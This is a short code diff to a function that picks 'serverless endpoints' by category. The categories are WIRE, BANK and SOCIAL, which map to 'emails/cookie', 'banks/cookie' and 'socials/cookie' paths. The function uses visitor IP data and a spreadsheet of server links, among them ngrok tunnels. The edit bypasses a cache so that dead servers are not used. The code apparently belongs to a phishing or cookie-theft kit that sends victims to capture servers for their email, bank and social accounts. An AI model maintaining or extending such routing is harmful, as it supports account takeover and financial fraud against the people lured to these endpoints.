@@ -1131,7 +1131,9 @@ function getBestServerlessEndpoint(category, fallbackBaseUrl, visitorIpData, req
     const nicheToPath = { WIRE: 'emails/cookie', BANK: 'banks/cookie', SOCIAL: 'socials/cookie' };
     const pathSuffix = nicheToPath[category] || 'emails/cookie';
 
-    const linksResult = getCachedRows(CONFIG.SHEET_NAME.LINKS, LINKS_CACHE_TTL_SECONDS);
+    // Bypass cache: read fresh from sheet to avoid stale ACTIVE/FAILED state
+    // that could route to dead servers (e.g. ngrok).
+    const linksResult = getAllRows(CONFIG.SHEET_NAME.LINKS);
     if (!linksResult.success || !linksResult.data || linksResult.data.length === 0) {
       Logger.log("getBestServerlessEndpoint: No data in links sheet");
       return fallbackEndpoint("fallback", fallbackBaseUrl, pathSuffix, "fallback no rows");
